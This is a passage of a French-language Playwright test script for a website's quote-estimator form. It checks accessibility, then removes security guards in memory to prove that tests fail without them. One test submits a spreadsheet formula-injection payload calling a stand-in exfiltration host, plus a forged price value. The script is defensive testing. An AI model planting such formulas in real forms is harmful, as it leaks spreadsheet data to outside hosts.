     compter cinq voudrait dire qu'on a mesuré une modale fermée. */
  if (tout.length < 50) {
    arret("seulement " + tout.length + " cible(s) mesurée(s) dans `#modal-estimate` — "
      + "les écrans n'étaient probablement pas peints (pièges 4 · 34).");
  }
  /* On dédoublonne sur « quoi + taille », sinon la barre de
     navigation paraîtrait quatorze défauts pour un seul bouton. */
  const vus = new Set();
  const distinctes = tout.filter((x) => {
    const cle = x.quoi + "|" + x.l + "|" + x.h;
    if (vus.has(cle)) return false;
    vus.add(cle); return true;
  });
  note("cibles mesurées : " + tout.length + " · distinctes : " + distinctes.length);

  const basses = distinctes.filter((x) => !x.enLigne && x.h < 44);
  const etroites = distinctes.filter((x) => !x.enLigne && x.l < 44);
  const enLigne = distinctes.filter((x) => x.enLigne && (x.h < 44 || x.l < 44));

  dire("aucune cible sous 44 px de HAUT", basses.length, 0,
    basses.map((x) => "écran " + x.ecran + " · " + x.quoi + "  " + x.l + " × " + x.h)
      .join("\n         · "));
  dire("aucune cible sous 44 px de LARGE", etroites.length, 0,
    etroites.map((x) => "écran " + x.ecran + " · " + x.quoi + "  " + x.l + " × " + x.h)
      .join("\n         · "));
  note("liens en ligne dans un paragraphe sous 44 px (exemptés WCAG 2.5.8) : "
    + (enLigne.length ? enLigne.map((x) => x.quoi + " " + x.l + "×" + x.h).join(" · ") : "aucun"));

  /* TÉMOIN D'INSTRUMENT : la sonde sait-elle voir une cible trop
     petite ? On en pose une, on mesure, on la retire. */
  await page.evaluate(() => {
    const b = document.createElement("button");
    b.id = "zzPetiteCible";
    b.style.cssText = "width:20px;height:20px;position:absolute;left:0;top:0";
    document.getElementById("modal-estimate").appendChild(b);
  });
  const avecTemoin = (await page.evaluate(MESURE)).filter((x) => x.quoi === "zzPetiteCible");
  dire("TÉMOIN D'INSTRUMENT · la sonde VOIT une cible de 20 × 20",
    avecTemoin.length === 1 && avecTemoin[0].l < 44 && avecTemoin[0].h < 44, true,
    JSON.stringify(avecTemoin));
  await page.evaluate(() => {
    const b = document.getElementById("zzPetiteCible");
    if (b) b.remove();
  });

  await page.screenshot({ path: path.join(SORTIE, "23-cibles-390.png") });
  await ctx.close();
}

/* ------------------------------------------------------------
   24 · LE DÉBORDEMENT ET LE TEXTE TRONQUÉ, EN 320 ET 390 px
   ------------------------------------------------------------ */
titre("24 · DÉBORDEMENT ET TRONCATURE, EN 320 puis 390 px");
{
  for (const largeur of [320, 390]) {
    remise();
    const { ctx, page } = await ouvrir({ largeur: largeur, hauteur: 844 });
    await ouvrirEstim(page);

    /* TÉMOIN D'INSTRUMENT, POSÉ AVANT DE CONCLURE. On tronque un
       bloc exprès et on vérifie que la sonde le voit. Sans ça,
       « aucun texte tronqué » pourrait vouloir dire « la sonde ne
       regarde rien ». */
    const SONDE = () => {
      const out = [];
      document.querySelectorAll("#modal-estimate .step:not([hidden]) *").forEach((el) => {
        if (!el.childNodes.length) return;
        const aDuTexte = [...el.childNodes].some((k) => k.nodeType === 3 && k.nodeValue.trim());
        if (!aDuTexte) return;
        const r = el.getBoundingClientRect();
        if (r.width < 1 || r.height < 1) return;
        if (el.scrollWidth > el.clientWidth + 1) {
          out.push((el.id || el.className || el.tagName) + " · "
            + el.scrollWidth + " > " + el.clientWidth
            + " · « " + (el.textContent || "").trim().slice(0, 40) + " »");
        }
      });
      return out;
    };
    await page.evaluate(() => {
      const p = document.createElement("p");
      p.id = "zzTronque";
      p.style.cssText = "white-space:nowrap;overflow:hidden;width:30px";
      p.textContent = "un texte beaucoup trop long pour trente pixels";
      document.querySelector("#modal-estimate .step:not([hidden])").appendChild(p);
    });
    const temoin = await page.evaluate(SONDE);
    dire(largeur + " px · TÉMOIN D'INSTRUMENT · la sonde VOIT un bloc tronqué",
      temoin.some((x) => x.indexOf("zzTronque") === 0), true, JSON.stringify(temoin));
    await page.evaluate(() => { const p = document.getElementById("zzTronque"); if (p) p.remove(); });

    /* Maintenant, les quatorze écrans pour de vrai. */
    const deborde = [], tronques = [];
    for (let e = 1; e <= 14; e++) {
      await page.evaluate((k) => {
        document.querySelectorAll("#wizard .step[data-step]").forEach((s) => {
          s.hidden = Number(s.dataset.step) !== k;
        });
        document.querySelectorAll("#wizard .step-second[data-pour]").forEach((b) => { b.hidden = false; });
        if (k === 14) {
          ["esDevis", "esDevisQuestion", "esDevisOui", "esDevisNon", "esPetit", "esSansPrix"]
            .forEach((id) => { const x = document.getElementById(id); if (x) x.hidden = false; });
        }
      }, e);
      await page.waitForTimeout(140);
      const d = await page.evaluate(() => {
        const p = document.querySelector("#modal-estimate .modal-panel");
        return {
          panneau: p.scrollWidth > p.clientWidth + 1
            ? p.scrollWidth + " > " + p.clientWidth : "",
          page: document.documentElement.scrollWidth > window.innerWidth + 1
            ? document.documentElement.scrollWidth + " > " + window.innerWidth : ""
        };
      });
      if (d.panneau) deborde.push("écran " + e + " · panneau " + d.panneau);
      if (d.page) deborde.push("écran " + e + " · page " + d.page);
      (await page.evaluate(SONDE)).forEach((x) => tronques.push("écran " + e + " · " + x));
    }
    dire(largeur + " px · aucun débordement horizontal", deborde.length, 0,
      deborde.join("\n         · "));
    dire(largeur + " px · aucun bloc de texte tronqué", tronques.length, 0,
      tronques.slice(0, 8).join("\n         · "));
    await page.screenshot({ path: path.join(SORTIE, "24-panneau-" + largeur + ".png") });
    await ctx.close();
  }
}

/* ------------------------------------------------------------
   25 · AU CLAVIER SEUL

   Six écrans d'un chemin, sans souris. Deux exigences : on
   atteint la fin, et CHAQUE arrêt porte un anneau visible.
   ------------------------------------------------------------ */
titre("25 · TRAVERSER LES SIX ÉCRANS AU CLAVIER");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();
  await ouvrirEstim(page);

  /* On active à la touche, jamais au clic : c'est le geste qu'on
     mesure. `presserSur` tabule jusqu'à l'élément voulu puis
     appuie sur Entrée. */
  async function tabuler(page, predicat, maxi) {
    for (let i = 0; i < (maxi || 40); i++) {
      const ou = await page.evaluate(() => {
        const a = document.activeElement;
        if (!a) return null;
        return {
          id: a.id || "", val: a.getAttribute("data-value") || "",
          dans: !!a.closest("#modal-estimate"),
          tag: a.tagName, cls: String(a.className || "").slice(0, 40),
          suivant: a.hasAttribute("data-esuivant"),
          soumet: a.hasAttribute("data-submit")
        };
      });
      if (ou && predicat(ou)) return ou;
      await page.keyboard.press("Tab");
      await page.waitForTimeout(60);
    }
    return null;
  }

  const arrets = [];
  const sansAnneau = [];
  async function releverArret() {
    const a = await page.evaluate(() => {
      const el = document.activeElement;
      if (!el || !el.closest("#modal-estimate")) return null;
      const s = getComputedStyle(el);
      const large = parseFloat(s.outlineWidth) > 0 && s.outlineStyle !== "none";
      const ombre = s.boxShadow && s.boxShadow !== "none";
      return {
        quoi: el.id || el.getAttribute("data-value") || String(el.className || el.tagName).slice(0, 40),
        anneau: large || ombre
      };
    });
    if (!a) return;
    arrets.push(a.quoi);
    if (!a.anneau) sansAnneau.push(a.quoi);
  }

  const CHEMIN = [
    (o) => o.val === "Une boutique en ligne",
    (o) => o.val === "25 à 250 produits"
  ];
  for (const p of CHEMIN) {
    const cible = await tabuler(page, p, 60);
    if (!cible) arret("au clavier : impossible d'atteindre une réponse du chemin (écran " + await ecran(page) + ").");
    await releverArret();
    await page.keyboard.press("Enter");
    await page.waitForTimeout(400);
  }
  dire("deux réponses au clavier mènent à l'écran des fonctions", await ecran(page), 8);

  /* Les cases : on tabule jusqu'à la première, Espace, puis on
     tabule jusqu'à « Continuer ». */
  const caseUne = await tabuler(page, (o) => o.tag === "INPUT", 30);
  if (!caseUne) arret("au clavier : aucune case atteinte à l'écran des fonctions.");
  await releverArret();
  await page.keyboard.press("Space");
  await page.waitForTimeout(200);
  const suiv = await tabuler(page, (o) => o.suivant, 30);
  if (!suiv) arret("au clavier : « Continuer » inatteignable à l'écran des fonctions.");
  await releverArret();
  await page.keyboard.press("Enter");
  await page.waitForTimeout(400);
  dire("les cases puis « Continuer » mènent à l'écran du soin", await ecran(page), 11);

  for (const p of [(o) => o.val === "Propre et rapide", (o) => o.val === "J’en ai une partie"]) {
    const c = await tabuler(page, p, 40);
    if (!c) arret("au clavier : réponse de l'écran 11 inatteignable.");
    await releverArret();
    await page.keyboard.press("Enter");
    await page.waitForTimeout(300);
  }
  const suiv2 = await tabuler(page, (o) => o.suivant, 30);
  await releverArret();
  await page.keyboard.press("Enter");
  await page.waitForTimeout(400);
  dire("l'écran du soin se franchit au clavier", await ecran(page), 12);

  for (const p of [(o) => o.val === "Dans 1 à 3 mois", (o) => o.val === "1 à 5 personnes"]) {
    const c = await tabuler(page, p, 40);
    if (!c) arret("au clavier : réponse de l'écran 12 inatteignable.");
    await releverArret();
    await page.keyboard.press("Enter");
    await page.waitForTimeout(300);
  }
  const suiv3 = await tabuler(page, (o) => o.suivant, 30);
  await releverArret();
  await page.keyboard.press("Enter");
  await page.waitForTimeout(400);
  dire("on arrive aux coordonnées au clavier seul", await ecran(page), 13);

  /* Les trois champs, puis l'envoi. */
  for (const id of ["esName", "esEmail", "esPhone"]) {
    const c = await tabuler(page, (o) => o.id === id, 30);
    if (!c) arret("au clavier : le champ #" + id + " est inatteignable.");
    await releverArret();
    await page.keyboard.type(id === "esEmail" ? "zz-clavier@exemple.ca"
      : id === "esPhone" ? "4185550142" : "ZZTEST Clavier");
  }
  const envoi = await tabuler(page, (o) => o.soumet, 30);
  if (!envoi) arret("au clavier : le bouton d'envoi est inatteignable.");
  await releverArret();
  await page.keyboard.press("Enter");
  await page.waitForTimeout(2000);

  dire("le parcours entier se fait au clavier", await ecran(page), 14);
  dire("et la fourchette paraît", MONTANT.test((await fourchetteVue(page)).texte), true,
    JSON.stringify(await fourchetteVue(page)));
  dire("une ligne au classeur", nbLignes(), 1);

  if (arrets.length < 10) {
    arret("seulement " + arrets.length + " arrêt(s) au clavier relevé(s) — "
      + "la sonde n'a pas assez regardé pour conclure sur les anneaux de focus.");
  }
  note("arrêts au clavier relevés : " + arrets.length);
  dire("CHAQUE arrêt porte un anneau visible", sansAnneau.length, 0, sansAnneau.join(" · "));
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await page.screenshot({ path: path.join(SORTIE, "25-clavier.png") });
  await ctx.close();
}

/* ------------------------------------------------------------
   26 · SOUS `prefers-reduced-motion: reduce`

   L'interdit de `CLAUDE.md` : le mouvement réduit ne doit jamais
   faire PERDRE ni INVERSER une information.
   ------------------------------------------------------------ */
titre("26 · LE QUESTIONNAIRE SOUS MOUVEMENT RÉDUIT");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir({ mouvementReduit: true });
  dire("le navigateur annonce bien le mouvement réduit",
    await page.evaluate(() => window.matchMedia("(prefers-reduced-motion: reduce)").matches), true);
  await ouvrirEstim(page);
  dire("la modale s'ouvre quand même", await ecran(page), 1);

  const compte = [];
  await choisir(page, "type_de_projet", "Une boutique en ligne");
  compte.push(await page.evaluate(() => document.getElementById("estimCompte").textContent));
  await choisir(page, "ampleur", "25 à 250 produits");
  compte.push(await page.evaluate(() => document.getElementById("estimCompte").textContent));
  await cocher(page, ["Le paiement en ligne", "Le calcul de la livraison"]);
  await continuer(page);
  compte.push(await page.evaluate(() => document.getElementById("estimCompte").textContent));
  await choisir(page, "niveau_design", "Une signature visuelle complète");
  await choisir(page, "contenu", "Tout est à faire");
  await continuer(page);
  compte.push(await page.evaluate(() => document.getElementById("estimCompte").textContent));
  await choisir(page, "echeancier", "Dans le mois");
  await choisir(page, "taille_equipe", "6 à 25 personnes");
  await continuer(page);
  compte.push(await page.evaluate(() => document.getElementById("estimCompte").textContent));
  dire("le compte avance normalement 2,3,4,5,6", compte.join(","), "2,3,4,5,6",
    "une information perdue sous mouvement réduit est un interdit du dépôt");

  await page.fill("#esName", "ZZTEST Reduit");
  await page.fill("#esEmail", "zz-reduit@exemple.ca");
  await page.fill("#esPhone", "418 555 0142");
  await page.evaluate(() => {
    document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
  });
  await page.waitForTimeout(2000);
  const f = await fourchetteVue(page);
  dire("la fourchette paraît", f.visible && MONTANT.test(f.texte), true, JSON.stringify(f));
  dire("les raisons du chiffre paraissent aussi",
    (await statut(page, "#esFourchetteSur")).indexOf("D’après") === 0, true,
    "lu : " + await statut(page, "#esFourchetteSur"));

  /* La version allégée : elle porte de l'information, elle doit
     apparaître aussi sous mouvement réduit. */
  await page.evaluate(() => {
    document.querySelector('#esDevisQuestion .choices button[data-value="Non"]').click();
  });
  await page.waitForTimeout(600);
  await page.evaluate(() => {
    document.querySelector('.choices[data-choice="prix_pourquoi"] button[data-value="C’est au-dessus de mon budget"]').click();
  });
  await page.waitForTimeout(700);
  const petit = await page.evaluate(() => {
    const p = document.getElementById("esPetit");
    return { visible: !!(p && !p.hidden),
      montant: (document.getElementById("esPetitMontant") || {}).textContent || "",
      retire: [...document.querySelectorAll("#esPetitRetire li")].length };
  });
  dire("la version allégée s'ouvre", petit.visible, true);
  dire("elle porte son montant", MONTANT.test(petit.montant), true, petit.montant);
  dire("et ce qui change est nommé", petit.retire >= 3, true, String(petit.retire) + " ligne(s)");
  dire("une seule ligne au classeur", nbLignes(), 1);
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await page.evaluate(() => document.getElementById("esPetit").scrollIntoView({ block: "center" }));
  await page.waitForTimeout(250);
  await page.screenshot({ path: path.join(SORTIE, "26-mouvement-reduit.png") });
  await ctx.close();
}

/* ============================================================
   PARTIE III — LE DÉSARMEMENT

   « UN TEST PEUT VERROUILLER LE DÉFAUT. » Un cas qui passe ne
   prouve rien tant qu'on n'a pas montré qu'il TOMBE quand la
   protection disparaît.

   LA MÉTHODE EST LA MÊME POUR LES QUATRE. Un `scenario(desarme)`
   rend une LISTE DE CONTRÔLES — la même liste dans les deux cas.
   On la joue armée, elle doit passer entière ; on la rejoue
   désarmée, et le nombre de contrôles qui tombent doit AUGMENTER.
   Un garde qu'on retire sans faire tomber un seul contrôle ne
   gardait rien, et le bilan de fin le dit en toutes lettres.

   LE DÉPÔT N'EST JAMAIS OUVERT EN ÉCRITURE. `js/main.js` est
   patché dans la RÉPONSE HTTP du banc ; `google/Code.gs` est lu,
   patché en mémoire, et évalué dans une seconde instance qui
   partage `etat`. Les empreintes sha256 le prouvent.
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE III · CE QUI TOMBE QUAND ON DÉSARME");
console.log("############################################################");

const bilanDesarmement = [];

/* Les contrôles qui ne tiennent pas, sur une liste `{quoi, obtenu,
   attendu}`. Ils ne passent PAS par `dire` : c'est leur COMPTE qui
   est le verdict, et le compter deux fois fausserait le total. */
function tombes(liste) {
  return liste.filter((c) => String(c.obtenu) !== String(c.attendu));
}
function rapporter(nom, arme, desarme, quoiDesarme) {
  const a = tombes(arme), d = tombes(desarme);
  dire(nom + " · ARMÉ, les " + arme.length + " contrôles passent", a.length, 0,
    a.map((c) => c.quoi + " : " + JSON.stringify(c.obtenu)
      + " au lieu de " + JSON.stringify(c.attendu)).join("\n         · "));
  dire(nom + " · DÉSARMÉ, ils TOMBENT", d.length > a.length, true,
    "armé : " + a.length + " tombé(s) · désarmé : " + d.length + " tombé(s)"
    + "\n         un garde qu'on retire sans rien casser ne gardait rien — " + quoiDesarme);
  d.forEach((c) => note("désarmé, tombe : " + c.quoi + " → " + JSON.stringify(c.obtenu)
    + " (attendu " + JSON.stringify(c.attendu) + ")"));
  bilanDesarmement.push({ nom: nom, arme: a.length, desarme: d.length, total: arme.length });
  return d.length - a.length;
}

/* ------------------------------------------------------------
   D1 · `validate()` retiré de l'envoi de l'estimateur
   ------------------------------------------------------------ */
titre("D1 · GARDE DU NAVIGATEUR — `validate()` retiré de l'envoi");
{
  async function scenario(desarme) {
    remise();
    const { ctx, page, posts } = await ouvrir(desarme ? {
      desarmer: (s) => s.replace(
        "if (!validate(estimateForm)) return;",
        "/* DESARME par cet outil */")
    } : {});
    await ouvrirEstim(page);
    await jusquAuxCoordonnees(page);
    const avant = posts.length;
    await page.evaluate(() => {
      document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
    });
    await page.waitForTimeout(1800);
    const liste = [
      { quoi: "aucune requête ne part d'un formulaire vide",
        obtenu: posts.length - avant, attendu: 0 },
      { quoi: "on reste sur l'écran des coordonnées", obtenu: await ecran(page), attendu: 13 },
      { quoi: "aucune ligne ne naît au classeur", obtenu: nbLignes(), attendu: 0 }
    ];
    await ctx.close();
    return liste;
  }
  const arme = await scenario(false);
  const desarme = await scenario(true);
  rapporter("D1 · validate()", arme, desarme,
    "ici elle épargne au visiteur un aller-retour ; c'est le SERVEUR qui garde la donnée, "
    + "et le classeur reste vide dans les deux cas");
}

/* ------------------------------------------------------------
   D2 · `btn.disabled` retiré de `setLoading()`
   ------------------------------------------------------------ */
titre("D2 · GARDE DU NAVIGATEUR — `btn.disabled` retiré de `setLoading()`");
{
  async function scenario(desarme) {
    remise();
    const { ctx, page, posts } = await ouvrir(desarme ? {
      desarmer: (s) => s.replace("btn.disabled = on;", "/* DESARME par cet outil */")
    } : {});
    await ouvrirEstim(page);
    await jusquAuxCoordonnees(page);
    await page.fill("#esName", "ZZTEST Desarme");
    await page.fill("#esEmail", "zz-desarme@exemple.ca");
    await page.fill("#esPhone", "418 555 0142");
    const avant = posts.filter((c) => c.indexOf('"_final":true') !== -1).length;
    await page.evaluate(() => {
      const b = document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]');
      b.click(); b.click();
    });
    await page.waitForTimeout(2200);
    const liste = [
      { quoi: "UNE seule requête finale part",
        obtenu: posts.filter((c) => c.indexOf('"_final":true') !== -1).length - avant, attendu: 1 },
      { quoi: "UNE seule ligne au classeur", obtenu: nbLignes(), attendu: 1 }
    ];
    await ctx.close();
    return liste;
  }
  const arme = await scenario(false);
  const desarme = await scenario(true);
  rapporter("D2 · setLoading()", arme, desarme,
    "le classeur, lui, tient dans les deux cas — c'est `_sid` qui le tient, pas le bouton. "
    + "Savoir lequel des deux protège quoi est tout l'intérêt de la passe");
}

/* ------------------------------------------------------------
   D3 · la purge serveur de `fourchette_vue`
   ------------------------------------------------------------ */
const CHEMIN_GS = path.join(RACINE, "google", "Code.gs");
const SOURCE_GS = fs.readFileSync(CHEMIN_GS, "utf8");
const EMPREINTE_GS = crypto.createHash("sha256").update(SOURCE_GS).digest("hex");
{
  let etatGit = "(inconnu)";
  try {
    etatGit = execFileSync("git", ["status", "--porcelain", "--", "google/Code.gs"],
      { cwd: RACINE, encoding: "utf8" }).trim() || "propre";
  } catch (e) { etatGit = "(git indisponible)"; }
  console.log("");
  console.log("       · état git de `google/Code.gs` : " + etatGit);
  console.log("       · l'outil ne l'ouvre JAMAIS en écriture : il le LIT, patche la chaîne");
  console.log("         en mémoire, et l'évalue dans une seconde instance qui partage `etat`.");
  console.log("         Écrire sur le disque puis restaurer obligerait à refuser de mesurer");
  console.log("         quand le fichier porte des modifications non validées — c'est-à-dire");
  console.log("         exactement pendant la session qui corrige un défaut. La passe qui");
  console.log("         compte le plus se sauterait toute seule, en silence, le jour où elle sert.");
  console.log("       · empreinte sha256 avant : " + EMPREINTE_GS.slice(0, 16) + "…");
}

/* Évalue un `Code.gs` patché, sans jamais toucher au disque. */
function serveurDesarme(ancre, remplacement, quoi) {
  if (SOURCE_GS.indexOf(ancre) === -1) {
    arret("l'ancre de " + quoi + " a bougé dans `Code.gs` — le désarmement prouverait "
      + "exactement l'inverse de ce qu'il annonce. (piège 86)");
  }
  const patche = SOURCE_GS.replace(ancre, remplacement);
  if (patche === SOURCE_GS) arret("le patch de " + quoi + " n'a rien changé.");
  const noms = Object.keys(services);
  return new Function(...noms, patche + "\n return { doPost, initialiser };")
    (...noms.map((x) => services[x]));
}

titre("D3 · GARDE DU SERVEUR — `delete data.fourchette_vue` désarmé");
{
  const CHARGE = () => estimation("desarmeVue", {
    email: "zz-desarme-vue@exemple.ca", fourchette_vue: "1 $ à 2 $" });

  function releve(instance) {
    remise();
    instance.initialiser();
    const r = JSON.parse(instance.doPost({
      postData: { contents: JSON.stringify(CHARGE()) } }).getContent());
    return [
      { quoi: "l'envoi passe", obtenu: r.success, attendu: true },
      { quoi: "la colonne porte la fourchette du SERVEUR",
        obtenu: valeur(2, "Fourchette vue"), attendu: "13 000 $ à 18 000 $" },
      { quoi: "le montant forgé n'apparaît nulle part dans la ligne",
        obtenu: feuille().valeurs[1].some((c) => String(c).indexOf("1 $ à 2 $") !== -1),
        attendu: false }
    ];
  }
  const arme = releve(gs);
  const desarme = releve(serveurDesarme(
    "if (data && data.fourchette_vue !== undefined) {",
    "if (false && data.fourchette_vue !== undefined) {",
    "la purge de `fourchette_vue`"));
  rapporter("D3 · purge de `fourchette_vue`", arme, desarme,
    "sans elle, un montant forgé se grave dans une colonne FIGÉE, et « ce que le "
    + "visiteur a vu » devient un mensonge qu'on ne peut plus corriger");
}

titre("D4 · GARDE DU SERVEUR — `texteInerte()` neutralisé");
{
  const CHARGE = () => estimation("desarmeInerte", {
    email: "zz-desarme-inerte@exemple.ca",
    nom: '=IMPORTXML("https://exfil.example","//a")',
    prix_raison: "=1+1" });

  function releve(instance) {
    remise();
    instance.initialiser();
    const r = JSON.parse(instance.doPost({
      postData: { contents: JSON.stringify(CHARGE()) } }).getContent());
    return [
      { quoi: "l'envoi passe", obtenu: r.success, attendu: true },
      { quoi: "AUCUNE cellule n'est un calcul", obtenu: cellulesCalculees(), attendu: 0 },
      { quoi: "le nom est rangé tel quel",
        obtenu: valeur(2, "Nom"), attendu: '=IMPORTXML("https://exfil.example","//a")' }
    ];
  }
  const arme = releve(gs);
  const desarme = releve(serveurDesarme(
    "return /^[=+\\-@]/.test(v) ? \"'\" + v : v;",
    "return v; /* DESARME */",
    "`texteInerte()`"));
  rapporter("D4 · texteInerte()", arme, desarme,
    "sans elle, `=IMPORTXML` part sous le compte de l'agence à chaque ouverture du "
    + "classeur — le format `@` n'y change RIEN, mesuré (piège 93)");
}

titre("D5 · LE DÉPÔT EST-IL INTACT ?");
{
  const apres = crypto.createHash("sha256").update(fs.readFileSync(CHEMIN_GS, "utf8")).digest("hex");
  dire("`google/Code.gs` porte la MÊME empreinte sha256 qu'au départ", apres, EMPREINTE_GS,
    "si elle avait changé : git checkout -- google/Code.gs");
  const mainJs = fs.readFileSync(path.join(RACINE, "js", "main.js"), "utf8");
  dire("`js/main.js` ne porte aucune marque de désarmement",
    mainJs.indexOf("DESARME par cet outil"), -1,
    "les patchs du navigateur vivent dans la RÉPONSE HTTP, jamais sur le disque");
}

/* ============================================================
   LE COMPTE
   ============================================================ */
await nav.close();
srvSite.close();
srvG.close();

console.log("");
console.log("--- BILAN DU DÉSARMEMENT");
bilanDesarmement.forEach((b) => {
  console.log("       · " + b.nom + " — " + b.total + " contrôles · armée : "
    + b.arme + " tombé(s) · désarmée : " + b.desarme + " tombé(s)"
    + (b.desarme > b.arme ? "" : "   ← ELLE NE GARDAIT RIEN"));
});

console.log("");
console.log("============================================================");
if (ko) {
  console.log("L'ESTIMATEUR NE TIENT PAS : " + ko + " échec(s) sur " + n);
  echecs.forEach((e) => console.log("  · " + e));
} else {
  console.log("L'ESTIMATEUR TIENT : " + n + " / " + n);
}
console.log("Captures : preuves/estimateur-attaque/");
console.log("RÉSERVE : Chromium/Playwright, machine de bureau Windows.");
console.log("          Aucun relevé ne vient d'un appareil réel, y compris ceux en 320 et 390 px.");
console.log("============================================================");
process.exit(ko ? 1 : 0);
